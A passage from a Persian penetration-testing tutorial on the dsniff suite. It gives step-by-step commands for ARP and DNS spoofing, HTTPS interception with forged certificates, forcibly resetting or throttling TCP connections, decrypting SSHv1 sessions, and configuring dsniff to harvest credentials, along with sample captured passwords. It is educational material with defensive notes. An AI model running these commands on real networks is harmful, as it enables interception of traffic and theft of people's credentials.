- **نکته مهم امنیتی:** SSH نسخه 2 به دلیل وجود مکانیزم تأیید هویت سرور (که در آن کلاینت کلید سرور را قبل از ارسال رمز عبور بررسی می‌کند) در برابر این حمله مقاوم است. بنابراین این ابزار عمدتاً برای اهداف آموزشی و نشان دادن اهمیت ارتقاء به نسخه‌های جدیدتر SSH استفاده می‌شود.

- **فلگ‌های ابزار sshmitm:**

|فلگ|کارکرد|مثال|
|---|---|---|
|`-i interface`|تعیین interface|`sudo sshmitm -i eth0`|
|`-l logfile`|ذخیره جلسات رمزگشایی شده در فایل لاگ|`sudo sshmitm -i eth0 -l ssh_session.log`|
|`-p port`|تعیین پورت جایگزین برای SSH (پیش‌فرض 22)|`sudo sshmitm -i eth0 -p 2222`|

###### 2: `webmitm` MITM for HTTP/HTTPS Protocols
- **توضیح:**
	ابزار `webmitm` یک ابزار حمله «مرد میانی» تخصصی برای پروتکل‌های HTTP و HTTPS است.. این ابزار به عنوان یک پروکسی شفاف (transparent proxy) عمل کرده و تمام ترافیک وب بین کلاینت و سرور را از سیستم مهاجم عبور می‌دهد.
	**آسیب‌پذیری هدف:**  
		این حمله بر این اساس کار می‌کند که کاربر معمولاً به گواهی SSL خودامضا (self-signed) توجه نمی‌کند یا هشدار مرورگر را نادیده می‌گیرد. در محیط‌های شرکتی که از گواهی‌های داخلی استفاده می‌شود، احتمال موفقیت حمله بیشتر است.

- **مکانیزم فنی عملکرد:**
	1. پروکسی شفاف: `webmitm` با استفاده از قابلیت redirection شبکه (مانند dnsspoof یا arpspoof)، تمام درخواست‌های وب کلاینت را به سمت خود هدایت می‌کند
    
	2. اتصال به سرور مقصد: ابزار به عنوان یک کلاینت به سرور واقعی متصل شده و درخواست را ارسال می‌کند
    
	3. دستکاری ترافیک: در حالت HTTP، تمام ترافیک به صورت متن واضح (plaintext) قابل مشاهده و دستکاری است.
	
	4. حمله به HTTPS: در حالت HTTPS، `webmitm` با استفاده از یک گواهی دیجیتال جعلی (self-signed certificate) با کلاینت ارتباط SSL برقرار کرده و همزمان با سرور واقعی ارتباط SSL جداگانه‌ای برقرار می‌کند.

- **مراحل استفاده و پیاده‌سازی:**

0. **مرحله صفر:** ساخت فایل `dsn.spoof` با محتویات زیر
	- نکته: آدرس 192.168.1.100 متعلق به سیستم تست نفوذگر است.
```txt
192.168.1.100 www.example.com
192.168.1.100 mail.example.com
```

1.  **مرحله اول:** فعال کردن IP forwarding در سیستم تست نفوذگر
```sh
#Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```

2. **مرحله دوم:** اجرای DNS Spoofing برای هدایت ترافیک به سمت خود
	- نکته: برای هدایت ترافیک به سمت خود از arpspoof هم میتوان استفاده کرد.
```sh
sudo dnsspoof -i eth0 -f dns.spoof
#or we can use arpspoof
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
```

3. **مرحله سوم:** اجرای webmitm به عنوان پراکسی شفاف (Transparent Proxy)
```sh
sudo webmitm -i eth0
```

4. **مرحله چهارم:** ذخیره لاگ ترافیک (اختیاری)
```sh
sudo webmitm -i eth0 -l captured_web.log
```

- **نکته فنی:**
	- ابزار `webmitm` برای کار با HTTPS نیاز به ایجاد یک گواهی SSL جعلی در زمان اجرا دارد که بصورت خودکار آنرا ایجاد میکند. نکته اینجاست که مرورگر کلاینت هنگام مواجهه با گواهی جعلی، یک هشدار امنیتی نمایش می‌دهد.

- **فلگ‌های ابزار webmitm:**

|فلگ|کارکرد|مثال|
|---|---|---|
|`-i interface`|تعیین interface|`sudo webmitm -i eth0`|
|`-l logfile`|ذخیره ترافیک در فایل لاگ|`sudo webmitm -i eth0 -l web_traffic.log`|
|`-b`|اجرا در حالت بدون مرورگر (headless)|`sudo webmitm -i eth0 -b`|

##### dsniff Suite: Network Traffic Manipulation
###### 1: `tcpkill` TCP Disconnector
- **توضیح:**
	ابزار `tcpkill` یک ابزار تخصصی برای قطع اجباری اتصالات TCP در حال انجام در شبکه محلی است. این ابزار با ارسال بسته‌های RST (Reset) به هر دو طرف ارتباط، باعث بسته شدن فوری اتصال TCP می‌شود.
	
	**آسیب‌پذیری هدف:**  
		پروتکل TCP فاقد مکانیزم احراز هویت برای بسته‌های RST است. هر دستگاه در مسیر شبکه می‌تواند با ارسال یک بسته RST جعلی، اتصال را قطع کند.

- **مکانیزم فنی عملکرد:**
	1. شنود ترافیک: `tcpkill` با استفاده از libpcap به ترافیک شبکه گوش می‌دهد.
    
	2. شناسایی اتصال هدف: بر اساس عبارت فیلتر (expression) که کاربر مشخص می‌کند، اتصالات TCP مورد نظر را شناسایی می‌کند.
    
	3. تخمین پنجره دریافت (Receive Window): ابزار سعی می‌کند موقعیت پنجره دریافت جریان TCP را تخمین بزند.
    
	4. ارسال بسته RST: با استفاده از libnet، بسته‌های RST جعلی با شماره سکانس مناسب به هر دو طرف ارتباط ارسال می‌کند.
    
	5. ضریب قدرت (Brute Force Degree): کاربر می‌تواند با گزینه `9...1-` میزان تلاش برای یافتن شماره سکانس صحیح را مشخص کند. اتصالات پرسرعت نیاز به مقدار بالاتری دارند.

- **سناریو استفاده:**
	- قطع اتصالات خاص در شبکه: برای اهداف آموزشی یا مدیریتی، می‌توان اتصالات یک پروتکل خاص را قطع کرد.

	- بازنشانی اجباری ارتباطات: در سناریوهای تست نفوذ برای قطع اتصالات رمزنگاری شده و وادار کردن کاربر به استفاده از اتصال رمزنگاری نشده.

- **ساختار کلی دستور:**
```sh
tcpkill [-i interface] [-1...9] expression
```

- **مثال های کاربردی:**

1. **مثال اول:** قطع تمام اتصالات SSH (پورت 22)
```sh
sudo tcpkill -i eth0 port 22
```

2. **مثال دوم:** قطع اتصالات HTTP یک کلاینت خاص
```sh
sudo tcpkill -i eth0 host 192.168.1.10 and port 80
```

3. **مثال سوم:** قطع اتصالات یک subnet کامل (با درجه قدرت 5 برای اتصالات پرسرعت)
```sh
sudo tcpkill -i eth0 -5 net 192.168.1.0/24
```

4. **مثال چهارم:** قطع اتصالات بین دو هاست خاص
```sh
sudo tcpkill -i eth0 host 192.168.1.10 and host 192.168.1.20
```

- **تشریح Expression(عبارت فیلتر):**
عبارت فیلتر از همان syntax استفاده می‌کند که در ابزار `tcpdump` به کار می‌رود.

| عبارت               | معنی                                 |
| ------------------- | ------------------------------------ |
| `port 80`           | تمام ترافیک با پورت مبدأ یا مقصد 80  |
| `host 192.168.1.10` | تمام ترافیک مربوط به IP مشخص شده     |
| `src port 22`       | فقط ترافیکی که پورت مبدأ آن 22 است.  |
| `dst port 443`      | فقط ترافیکی که پورت مقصد آن 443 است. |
| `tcp and port 21`   | صرفاً ترافیک TCP روی پورت 21         |

- **گزینه `9...1-` (درجه قدرت):**
مقادیر پایین‌تر (1-3): برای اتصالات کند مناسب است.

مقادیر بالاتر (7-9): برای اتصالات پرسرعت (مانند مرورگرهای مدرن) مورد نیاز است.

مقدار پیش‌فرض: 3

- **خروجی نمونه در هنگام اجرا:**
```
tcpkill: listening on eth0 [port 80]
192.168.1.10:54321 > 93.184.216.34:80: R 123456:123456(0) win 0
93.184.216.34:80 > 192.168.1.10:54321: R 789012:789012(0) win 0
```

###### 2: `tcpnice` TCP Throttling
- **توضیح:**
	ابزار `tcpnice` یک ابزار تخصصی برای کاهش سرعت (Throttling) اتصالات TCP در شبکه محلی است. برخلاف `tcpkill` که اتصال را قطع می‌کند، `tcpnice` با استفاده از تکنیک‌های active traffic shaping (شکل‌دهی ترافیک فعال) باعث کاهش نرخ انتقال داده می‌شود.
	
	**آسیب‌پذیری هدف:**  
		پروتکل TCP و ICMP فاقد احراز هویت هستند. یک مهاجم در مسیر شبکه می‌تواند بسته‌های جعلی ارسال کرده و رفتار TCP را دستکاری کند.

- **مکانیزم فنی عملکرد:**
	ابزار `tcpnice` از سه روش مختلف برای کاهش سرعت اتصال TCP استفاده می‌کند:
		
	1. **روش Tiny Window Advertisements فلگ `A-`:**
		ارسال بسته‌های TCP با پنجره دریافت بسیار کوچک (tiny window) به فرستنده، که باعث می‌شود فرستنده فقط بتواند تعداد بسیار محدودی بسته ارسال کند.
		
	2. **روش ICMP Source Quench فلگ `I-`:**
		ارسال پیام‌های ICMP Source Quench به فرستنده که در تئوری به فرستنده اعلام می‌کند «مسیر ازدحام دارد، لطفاً سرعت ارسال را کم کن». (این روش در اینترنت مدرن عمدتاً غیرفعال است)

	3. **روش ICMP Fragmentation Needed فلگ `M-`:**
		ارسال پیام‌های ICMP Fragmentation Needed با MTU بسیار کوچک (مثلاً 68 بایت) که باعث می‌شود فرستنده اندازه بسته‌های خود را کاهش داده و در نتیجه کارایی کاهش یابد.

- **سناریوی استفاده:**
	- شبیه‌سازی شرایط شبکه با پهنای باند محدود: بدون نیاز به تغییر تجهیزات شبکه بصورت فیزیکی 
    
	- تست نفوذ: کاهش سرعت اتصالات هدف برای تسهیل حملات دیگر (مانند sniffing)

- **ساختار کلی دستور:**
```sh
tcpnice [-A] [-I] [-M] [-i interface] expression
```

- **نکته:** اگر هیچ یک از گزینه‌های `M , -I , -A-` مشخص نشود، هر سه روش به صورت همزمان فعال خواهند شد. 

- **مثال های کاربردی:**

1. **مثال اول:** کاهش سرعت تمام اتصالات HTTP با استفاده از هر سه روش
```sh
sudo tcpnice -i eth0 port 80
```

2. **مثال دوم:** فقط با استفاده از Tiny Window (روش مؤثرتر در اینترنت مدرن)
```sh
sudo tcpnice -A -i eth0 host 192.168.1.10
```

3. **مثال سوم:** کاهش سرعت اتصالات FTP یک کلاینت خاص (با روش ICMP)
```sh
sudo tcpnice -I -M -i eth0 host 192.168.1.10 and port 21
```

4. **مثال چهارم:** کاهش سرعت تمام ترافیک یک subnet
```sh
sudo tcpnice -i eth0 net 192.168.1.0/24
```

- **مقایسه روش‌ها در شبکه‌های مدرن:**

| روش                  | وضعیت در اینترنت امروز | اثربخشی                                                       |
| -------------------- | ---------------------- | ------------------------------------------------------------- |
| `-A` (Tiny Window)   | فعال                   | بالا - اکثر ماشین‌های مدرن از این روش پیروی می‌کنند.          |
| `-M` (Frag Needed)   | محدود                  | متوسط - برخی فایروال‌ها این بسته‌ها را فیلتر می‌کنند          |
| `-I` (Source Quench) | غیرفعال                | بسیار پایین - اکثر سیستم‌عامل‌ها این پیام را نادیده می‌گیرند. |

- **نکته تخصصی:** روش Tiny Window با `A-` مؤثرترین روش در شبکه‌های امروزی است. با ارسال اعلان پنجره 0 (Zero Window)، می‌توان فرستنده را به طور کامل متوقف کرد. در واقع، `tcpnice` با گزینه `A-` می‌تواند پهنای باند مؤثر یک اتصال TCP را به کمتر از 1 کیلوبایت بر ثانیه کاهش دهد.



###### 3: `sshow` SSHv1 Decoder & Analyzer
- **توضیح:**
	ابزار `sshow` یکی از ابزارهای تخصصی مجموعه dsniff است که برای تحلیل و رمزگشایی نشست‌های SSH نسخه 1 طراحی شده است.
	
	**آسیب‌پذیری هدف:**  
		ابزار `sshow` از ضعف های ساختاری در SSHv1 مانند عدم استفاده از MAC مستقل (Message Authentication Code)، استفاده از الگوریتم‌های رمزنگاری ضعیف، نبود Perfect Forward Secrecy، طراحی ضعیف تبادل کلید و آسیب‌پذیری در برابر Session Key Recovery استفاده میکند. در صورت دستیابی تست نفوذگر به - Private Key سرور یا Session Key امکان رمزگشایی کامل ترافیک SSHv1 وجود دارد.

- **مکانیزم فنی عملکرد:**
	فاز 1: ابتدا مهاجم با ابزارهایی مانند tcpdump , ettercap و یا dsniff ترافیک SSHv1 را capture می‌کند.
	
	فاز 2: سپس اگر کلید خصوصی سرور در دسترس باشد، sshow می‌تواند Handshake اولیه را تحلیل کند، Session Key را استخراج کند و ترافیک رمز شده را decrypt کند.
	
	فاز 3: در نهایت sshow موارد Username و Password (در برخی سناریوها)، دستورات اجرا شده، خروجی دستورات و فایل‌های منتقل شده را بازسازی میکند.

- **سناریوی استفاده:**
	- سناریو Red Team:
		1. مهاجم از طریق ARP Spoofing در MITM قرار می‌گیرد.
		2. ترافیک SSHv1 را capture می‌کند.
		3. کلید خصوصی سرور را قبلاً سرقت کرده است.
		4. با sshow نشست را decrypt می‌کند.
		
	- سناریو Forensics / Blue Team:
		- تحلیل فایل pcap قدیمی
		- بررسی نفوذهای تاریخی
		- بازسازی فعالیت مهاجم

- **ساختار کلی دستور:**
```sh
sshow [options] -r <pcap_file> -k <private_key>
```

- **مثال های کاربردی:**

1. **مثال اول:** تحلیل نشست SSHv1
```sh
sshow -r capture.pcap -k ssh_host_key
```

2. **مثال دوم:** مشخص کردن پورت غیر استاندارد
```sh
sshow -r capture.pcap -k ssh_host_key -p 2222
```

3. **مثال سوم:** تحلیل با Debug
```sh
sshow -d -r session.pcap -k /etc/ssh/ssh_host_key
```

- **فلگ‌های ابزار sshow:**

|گزینه|توضیح|
|---|---|
|`-r`|فایل capture شده (pcap)|
|`-k`|کلید خصوصی SSH|
|`-p`|پورت SSH (پیش‌فرض 22)|
|`-d`|سطح Debug|

- **نکته دفاعی:**
	برای دفاع در مقابل sshow باید SSHv1 را غیرفعال کنیم و از SSHv2 استفاده کنیم. همچنین میتوانیم از ویژگی Perfect Forward Secrecy استفاده کنیم. کلیدهای قدیمی را باید حذف کنیم و آنها را با کلیدهای بروز جایگذاری کنیم. در آخر استفاده از IDS برای تشخیص ARP Spoofing نیز روشی پیشگرانه و بسیار مفید است.
##### dsniff Suite: Configuration / Customization
شخصی‌سازی (Customization) مجموعه ابزارهای dsniff از روش‌های مختلفی امکان‌پذیر است. در این بخش، تمام روش‌های تنظیم و پیکربندی dsniff را بررسی می‌کنیم.
###### Services & Triggers
در معماری dsniff، هر اتصال TCP ورودی باید به یک «پروتکل کاربردی» نسبت داده شود تا ابزار بداند به دنبال چه الگوهایی (مانند USER/PASS در FTP یا Authorization در HTTP) بگردد. دو مکانیزم برای این نگاشت وجود دارد:

| مکانیزم            | نحوه کار                                                         | دستور مربوطه      |
| ------------------ | ---------------------------------------------------------------- | ----------------- |
| **Services Table** | نگاشت `Port/Protocol` به `Service Name` از طریق یک فایل پیکربندی | `-f services`     |
| **Triggers**       | تعریف مستقیم همین نگاشت‌ها در خط فرمان (بدون نیاز به فایل)       | `-t trigger[...]` |

هسته مرکزی این مکانیزم، فایل پیش‌فرض `/usr/share/dsniff/dsniff.services` است.dsniff هنگام دریافت سیگنال SIGHUP (hangup)، جدول تریگرهای فعلی خود را در همین فایل ذخیره می‌کند.

- **توضیح بوسیله یک سناریوی واقعی (تحلیل ترافیک یک نرم‌افزار اختصاصی سازمانی):**
فرض کنید در یک سازمان بزرگ، توسعه‌دهندگان از یک نرم‌افزار مدیریت پروژه داخلی استفاده می‌کنند که روی پورت غیراستاندارد **8088** اجرا می‌شود و از پروتکل **HTTP** برای ارتباط استفاده می‌کند. از طرفی، یک سرویس **API داخلی** نیز روی پورت **8443** اجرا می‌شود که از پروتکل **HTTPS** استفاده می‌کند. همچنین یک سرویس **دیتابیس PostgreSQL قدیمی** روی پورت **5433** (به جای پورت پیش‌فرض 5432) در حال اجراست.

هدف ما پیکربندی dsniff برای شناسایی و استخراج اعتبارنامه‌های این سرویس‌ها است.

---------

1. **روش اول - بوسیله فایل Service Files:**
**مرحله 1:** ایجاد فایل سفارشی به نام `custom_services.conf` با محتوای زیر:
```sh
8088/tcp=http
8443/tcp=https
5433/tcp=postgres
```

توضیح: هر خط فرمت `Port/Protocol=Service` را دنبال می‌کند. نام سرویس باید با نام‌هایی که dsniff می‌شناسد (مانند http, https, ftp, postgres, imap, pop3 و ...) مطابقت داشته باشد.

**مرحله 2:** اجرای dsniff با این فایل سفارشی:
```sh
sudo dsniff -i eth0 -f custom_services.conf -m
```

**مرحله 3:** در ترمینال دیگر، اجرای arpspoof برای هدایت ترافیک:
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
```

**نتیجه:** اکنون dsniff ترافیک روی پورت‌های 8088، 8443 و 5433 را نیز به عنوان HTTP، HTTPS و PostgreSQL شناسایی کرده و اعتبارنامه‌های آن‌ها را استخراج می‌کند. این در حالی است که بدون این تنظیمات، dsniff تنها پورت‌های استاندارد (80، 443، 5432) را بررسی می‌کرد.

-------

2. **روش دوم - استفاده از Triggers:**
برای سناریوهای سریع و موقتی که نیازی به نگهداری فایل پیکربندی نداریم، می‌توانیم مستقیماً از گزینه `t-` استفاده کنیم.
```sh
sudo dsniff -i eth0 -t 8088/tcp=http,8443/tcp=https,5433/tcp=postgres -m
```

-------

- **روش تکمیلی: مشاهده Triggers ها در حین اجرا**
ابزار dsniff قابلیت جالبی دارد: با ارسال سیگنال SIGHUP به فرآیند در حال اجرا، جدول تریگرهای فعلی در فایل `dsniff.services` ذخیره می‌شود. برای مثال:

1. در ترمینال اول dsniff را اجرا میکنیم:
```sh
sudo dsniff -i eth0
```

2. در ترمینال دوم، PID فرآیند dsniff را پیدا کرده و سیگنال را می‌فرستیم:
```sh
sudo kill -HUP $(pgrep dsniff)
```

پس از این کار، می‌توانیم فایل `/usr/share/dsniff/dsniff.services` را بررسی کنیم که شامل تمام تریگرهای شناسایی شده تا آن لحظه است.

---------

- **مزیت کلیدی این قابلیت‌ها:** این مکانیزم‌ها به ما اجازه می‌دهند:

1. سرویس‌های روی پورت‌های غیراستاندارد را شناسایی کنیم.
    
2. پروتکل‌های جدید به dsniff اضافه کنیم.
    
3. تنظیمات را در فایل‌های پیکربندی برای استفاده مجدد در جلسات بعدی ذخیره کنیم.
    
###### Use Magic File
فایل‌های جادویی Magic Files در مجموعه ابزارهای dsniff، فایل‌هایی هستند که شامل الگوهای شناسایی (signatures) برای تشخیص خودکار پروتکل‌های شبکه می‌باشند که به این الگو ها یا قوانین Magic Rules گفته میشود. این فایل‌ها به ابزار dsniff اجازه می‌دهند تا حتی زمانی که سرویسی روی پورت غیراستاندارد اجرا می‌شود، نوع پروتکل آن را از روی محتوای بسته‌ها (payload) شناسایی کند. در واقع با استفاده از Magic Files ها میتوانیم DPI (Deep Packet Inspection) را بصورت شخصی سازی شده استفاده کنیم.

- **کاربرد Magic Files:** کاربرد اصلی Magic Files در سناریوهای زیر است:

	1. شناسایی پروتکل روی پورت‌های غیراستاندارد: زمانی که یک سرویس مانند SSH روی پورت 2222 (به جای پورت 22 پیش‌فرض) اجرا می‌شود، dsniff با استفاده از magic file می‌تواند آن را شناسایی کند.
    
	2. تشخیص پروتکل‌های رمزنگاری نشده: بسیاری از پروتکل‌های قدیمی (مانند FTP، Telnet، POP3) الگوهای باینری مشخصی در ابتدای ارتباط خود دارند که در magic files تعریف می‌شوند.
    
	3. تمایز بین پروتکل‌های مشابه: magic files می‌توانند پروتکل‌هایی که روی پورت‌های یکسان اجرا می‌شوند را از هم تشخیص دهند.
---------

- **روش استفاده و پیاده‌سازی Magic Files:**

1. **مرحله 1:** مشاهده فایل magic پیش‌فرض
	در سیستم‌های لینوکسی که dsniff نصب شده است، فایل magic پیش‌فرض در مسیر زیر قرار دارد:
```sh
/usr/share/dsniff/dsniff.magic

#مشاهده محتوای فایل
cat /usr/share/dsniff/dsniff.magic
```

2. **مرحله 2:** استفاده از فایل magic سفارشی با فلگ `M-`
	برای بارگذاری یک فایل magic سفارشی، از فلگ `M-` استفاده می‌کنیم.
```sh
sudo dsniff -i eth0 -M /path/to/custom.magic
```
- **نکته مهم:** فلگ `M-` را نمی‌توان همزمان با فلگ `t-` (تعریف مستقیم تریگرها در خط فرمان) استفاده کرد

3. **مرحله 3:** فعال‌سازی تشخیص خودکار پروتکل با فلگ `m-`
	برای فعال‌سازی قابلیت تشخیص خودکار پروتکل با استفاده از Magic File، از فلگ `m-` استفاده می‌شود.
```sh
sudo dsniff -i eth0 -m
```
در این حالت، dsniff علاوه بر بررسی پورت‌های استاندارد، از magic files برای شناسایی پروتکل بر اساس محتوای بسته‌ها استفاده می‌کند.

----------------------

- **ساختار Magic File:**
فایل magic از ساختار زیر پیروی می‌کند:
```sh
[offset] [type] [value] [message]
```

| فیلد    | توضیح                                                                        | مثال     |
| ------- | ---------------------------------------------------------------------------- | -------- |
| offset  | موقعیت بایت در payload که بررسی شروع می‌شود (معمولاً 0)                      | `0`      |
| type    | نوع داده برای مقایسه (`string`, `byte`, `short`, `long`)                     | `string` |
| value   | مقدار مورد جستجو (در صورت string، می‌تواند به صورت متنی یا hexadecimal باشد) | `"SSH-"` |
| message | پیامی که در صورت تشخیص نمایش داده می‌شود                                     | `ssh`    |

-----------
- **مثال‌های Magic Files**

1. **مثال 1:** شناسایی پروتکل SSH
	- سناریو استفاده: یک سرور SSH روی پورت 2222 اجرا می‌شود. dsniff با استفاده از این magic rule، صرف نظر از پورت، جریان را به عنوان SSH شناسایی کرده و سعی می‌کند رمز عبور را استخراج کند.
```
0	string	SSH-	ssh
```
این قانون به dsniff می‌گوید: اگر در ابتدای payload یعنی offset 0 رشته "SSH-" یافت شد، پروتکل را به عنوان "ssh" شناسایی کن.

2. **مثال 2:** شناسایی پروتکل FTP
	پروتکل FTP معمولاً با پیام خوش‌آمدگویی (banner) شامل "220" شروع می‌شود.
```
0	string	220	ftp
```

3. **مثال 3:** شناسایی پروتکل HTTP
	درخواست‌های HTTP با متدهایی مانند GET، POST یا HEAD شروع می‌شوند.
```
0	string	GET	    http
0	string	POST	http
0	string	HEAD	http
```

4. **مثال 4:** شناسایی پروتکل POP3
	سرور POP3 با پیام "OK+" به کلاینت پاسخ می‌دهد.
```
0	string	+OK	pop3
```

5. **مثال 5:** شناسایی پروتکل SMTP
	سرور SMTP با کد 220 پاسخ می‌دهد و کلاینت با دستورات HELO یا EHLO شروع می‌کند.
```
0	string	220	    smtp
0	string	EHLO	smtp
0	string	HELO	smtp
```

--------

- **سناریو های عملی استفاده از Magic Files**

1. **سناریو 1:** شناسایی سرویس FTP روی پورت غیراستاندارد
	شرایط: یک سازمان به دلایل امنیتی، سرویس FTP خود را روی پورت 2121 اجرا می‌کند. در این سناریو با استفاده از dsniff و Magic File به شناسایی سرویس FTP میپردازیم.

```sh
sudo dsniff -i eth0 -m 'port 2121'
```
ابزار dsniff با استفاده از magic rule مربوط به FTP (جستجوی رشته "220")، پروتکل را به درستی شناسایی کرده و رمز عبور ارسالی را استخراج می‌کند.

**خروجی نمونه:**
```
dsniff: listening on eth0 [port 2121]
----------------------------
09/15/21 14:32:15 tcp 192.168.1.10.3456 -> 192.168.1.5.2121 (ftp)
USER admin
PASS mysecret123
```


2. **سناریو 2:** شناسایی ترافیک SSH روی پورت 443 (که ممکن است با HTTPS اشتباه گرفته شود)
	شرایط: برخی نرم‌افزارهای تونل‌زن SSH، سرویس SSH را روی پورت 443 اجرا می‌کنند تا از فایروال‌ها عبور کنند.
	
	چالش: پورت 443 معمولاً متعلق به HTTPS است.
	
	راهکار: magic file می‌تواند با بررسی payload این دو را تشخیص دهد.
	
	ساختار Magic File مورد نیاز:
```sh
0	string	SSH-	ssh
0	string	\0x16\0x03	ssl	# SSL/TLS handshake
```

حال زمانیکه dsniff را اجرا کنیم، ابزار با دیدن رشته "-SSH" در ابتدای بسته، پروتکل را SSH تشخیص می‌دهد، حتی اگر روی پورت 443 باشد.
```sh
sudo dsniff -i eth0 -m 'port 443'
```


3. **سناریو 3:** ایجاد Magic File سفارشی برای پروتکل اختصاصی سازمانی
	شرایط: سازمان شما از یک پروتکل اختصاصی (custom protocol) برای ارتباط بین سرورها استفاده می‌کند که رمزنگاری نشده است و می‌خواهید در محیط آزمایشگاهی ترافیک آن را تحلیل کنید. 
	راه حل: در این سناریو ابتدا باید Protocol Signature مربوط به Custom Protocol را بدست بیاوریم و براساس آن یک Magic File سفارشی برای پروتکل بسازیم. سپس نیز dsniff را با Magic File ساخته شده اجرا میکنیم تا ترافیک پروتکل شخصی سازی شده توسط ابزار شناسایی شود.

- سناریو 3 مرحله 1 - شناسایی signature پروتکل: با استفاده از Wireshark یا tcpdump، الگوی ثابت ابتدای بسته‌های پروتکل را پیدا میکنیم. فرض کنید پروتکل با چهار بایت `0xDE 0xAD 0xBE 0xEF` شروع می‌شود.
    
- سناریو 3 مرحله 2 - ایجاد Magic File سفارشی `custom.magic`:
```
echo "0	string	\xDE\xAD\xBE\xEF	custom_proto" > custom.magic
```

- سناریو 3 مرحله 3 - استفاده از Magic File سفارشی:
```sh
sudo dsniff -i eth0 -M custom.magic -m
```

ابزار dsniff اکنون ترافیک این پروتکل اختصاصی را شناسایی کرده و اطلاعات احراز هویت (اگر در payload باشد) را استخراج می‌کند.
###### Magic Files VS Triggers

| ویژگی             | Magic Files (`-M`)                        | Triggers (`-t`)                |
| ----------------- | ----------------------------------------- | ------------------------------ |
| **مبنای شناسایی** | محتوای payload (امضای باینری)             | پورت + پروتکل                  |
| **انعطاف‌پذیری**  | بالا (قابل تشخیص روی هر پورتی)            | پایین (وابسته به پورت)         |
| **پیچیدگی تنظیم** | نیاز به دانش ساختار پروتکل                | ساده (فقط پورت و نام سرویس)    |
| **موارد استفاده** | پورت‌های غیراستاندارد، پروتکل‌های اختصاصی | پورت‌های استاندارد             |
| **تداخل**         | نمی‌تواند با `t-` استفاده شود.            | نمی‌تواند با `M-` استفاده شود. |

###### `dsnspoof.hosts` DNS Map 
این فایل، **منبع mapping نام دامنه به IP** برای ابزار `dnsspoof` است که در مسیر `/etc/dsniff/dnsspoof.hosts` قرار دارد. در واقع وقتی `dnsspoof` در حالت MITM یا روی ترافیک DNS monitor اجرا می‌شود، اگر query دامنه‌ای با یکی از رکوردهای این فایل match شود، پاسخ DNS جعلی تولید می‌کند.

- **مکانیزم عملکرد:**
	- ابزار DNS query را sniff می‌کند.
	
	- نام دامنه را با رکوردهای فایل compare می‌کند.
	
	- اگر match شد، پاسخ forged DNS response می‌سازد.
	
	- مقصد query به IP تعریف‌شده redirect می‌شود.

- **فرمت فایل:** هر خط معمولاً مانند زیر است.
```
<ip_address> <domain_name>
```

مثال:
```
10.10.10.50   login.company.local
10.10.10.60   update.company.local
192.168.1.100  *.internal.example
```

- **پیکربندی و استفاده:** برای استفاده از این فایل از `f-` استفاده میشود.
```sh
dnsspoof -i eth0 -f /etc/dsniff/dnsspoof.hosts
```

- **سناریوی استفاده:**
	- Red Team / Controlled Test
		- یک lab داخلی دارید.
		- می‌خواهید `portal.company.local` را به یک web server آزمایشی هدایت کنید.
		- با `dnsspoof.hosts` این redirect را بدون دستکاری DNS server اصلی شبیه‌سازی می‌کنید.
	
	- Blue Team / Detection Lab
		- برای شبیه‌سازی حمله DNS spoofing در محیط دفاعی، فایل را با رکوردهای test پر می‌کنید.
		- سپس IDS/EDR و logging را در برابر redirect جعلی تست می‌کنید.


###### Additional Note: Libraries Configuration
ابزار dsniff از کتابخانه های libnids و libpcap استفاده میکند که هرکدام از این کتابخانه ها را میتوان بصورت مجزا کانفیگ کرد که در نتیجه بر روی dsniff نیز تاثیر میگذارد.

1. **کانفیگ libpcap بوسیله متغیرهای محیطی:**
این کتابخانه با یکسری از متغیر محیطی کار میکند که با تنظیم آنها میتوانیم رفتار کتابخانه را شخصی سازی کنیم. این متغیرهای محیطی عبارتند از:
	- `PCAP_IFACE`
		- تعیین interface پیش‌فرض برای libpcap
	- `LIBPCAP_DEBUG`
		- فعال‌سازی دیباگ libpcap

2. **کانفیگ libnids از طریق فایل `libnids.conf`:**
ابزار dsniff از کتابخانه libnids برای بازسازی جریان TCP استفاده می‌کند. برخی از پارامترهای این کتابخانه از طریق فایل کانفیگ قابل تنظیم هستند:
	- `tcp_checksum_off`
		- فعال کردن (0) و غیرفعال کردن (1) Checksum در TCP
	- `scan_num`
		- تعیین اندازه Scan Buffer
```sh
tcp_checksum_off = 1

scan_num = 1000
```
##### BPF (Berkeley Packet Filter)
###### Syntax - Filters & Operators
ابزار dsniff از Berkeley Packet Filter (BPF) برای فیلتر کردن نتایج استفاده می‌کند. ساختار کلی به شکل زیر است:
```sh
dsniff [options] [filter expression]
```

- **فیلترهای موجود:**
1. فیلتر `host`: فقط ترافیک یک IP خاص
	`host 192.168.1.10`

2. فیلتر `src host`: فقط ترافیک خروجی از این IP خاص
	`src host 192.168.1.5`

3. فیلتر `dst host`: فقط ترافیک ورودی به این IP
	`dst host 192.168.1.20`

4. فیلتر `net`: کل شبکه
	`net 192.168.1.0/24`

5. فیلتر `port`: هر پروتکلی روی این پورت
	`port 80`

6. فیلتر `src port`: فقط ترافیک خروجی از پورت مشخص
	`src port 21`

7. فیلتر `dst port`: فقط ترافیک ورودی به پورت مشخص
	`dst port 25`

8. فیلتر `portrange`: مشخص کردن رنج پورت
	`portrange 20-25`

9. فیلتر `tcp`: فقط ترافیک TCP
	`tcp`

10. فیلتر `udp`: فقط ترافیک UDP
	`udp`

11. فیلتر `icmp`: فقط ترافیک پروتکل ICMP
	`icmp`

12. فیلتر `ether host`: فقط ترافیک مک وارد شده
	`ether host 00:11:22:33:44:55`

13. فیلتر `broadcast`: فقط ترافیک های Broadcast
	`broadcast`

14. فیلتر `multicast`: فقط ترافیک های Multicast
	`multicast`

-----------

- **علمگرها و ترکیب فیلترها:**
1. عملگر AND:
	`tcp and port 80`

2. عملگر OR:
	`port 80 or port 443`

3. عملگر NOT:
	`not host 192.168.1.1`

##### Common Attacks Implementation with dsniff
###### Description
در این بخش، مهم‌ترین و پرکاربردترین حملاتی که می‌توان با استفاده از مجموعه ابزارهای dsniff پیاده‌سازی کرد را به صورت گام‌به‌گام تشریح می‌کنیم. هر حمله شامل سه بخش است:

- **سناریو و محل استفاده:** توضیح موقعیتی که حمله در آن کاربرد دارد.
    
- **مکانیزم عملکرد:** نحوه عملکرد فنی حمله
    
- **روش پیاده‌سازی گام‌به‌گام:** دستورات دقیق برای اجرا در محیط آزمایشگاهی

